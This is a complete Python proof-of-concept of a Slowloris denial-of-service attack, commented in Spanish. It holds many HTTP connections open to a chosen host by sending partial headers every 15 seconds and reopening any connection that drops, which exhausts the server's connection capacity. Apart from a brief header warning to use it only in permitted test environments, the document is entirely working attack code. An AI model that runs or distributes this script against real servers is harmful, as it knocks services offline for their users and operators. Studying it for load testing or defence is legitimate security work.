#!/usr/bin/env python3
# Simple Slowloris PoC (para pruebas controladas desde una máquina separada)
# Advertencia: usar únicamente en entornos de prueba controlados y con permiso.

import socket
import time
import sys
import random

if len(sys.argv) < 4:
    print("Usage: python3 slowloris.py <host> <port> <sockets>")
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
num_sockets = int(sys.argv[3])

def create_sockets():
    sockets = []
    for _ in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(b"GET /?%d HTTP/1.1\r\n" % random.randint(0, 9999))
            s.send(b"User-Agent: slowloris-test\r\n")
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            sockets.append(s)
        except Exception as e:
            print("Error creando socket:", e)
            break
    return sockets

def keep_alive(sockets):
    try:
        while True:
            for s in list(sockets):
                try:
                    s.send(b"X-a: b\r\n")
                except Exception:
                    sockets.remove(s)
            # re-create sockets if some closed
            while len(sockets) < num_sockets:
                sockets += create_sockets()
            time.sleep(15)
    except KeyboardInterrupt:
        print("Interrumpido por usuario, cerrando sockets")
        for s in sockets:
            s.close()

if __name__ == '__main__':
    socks = create_sockets()
    print(f"Sockets abiertos: {len(socks)}")
    keep_alive(socks)
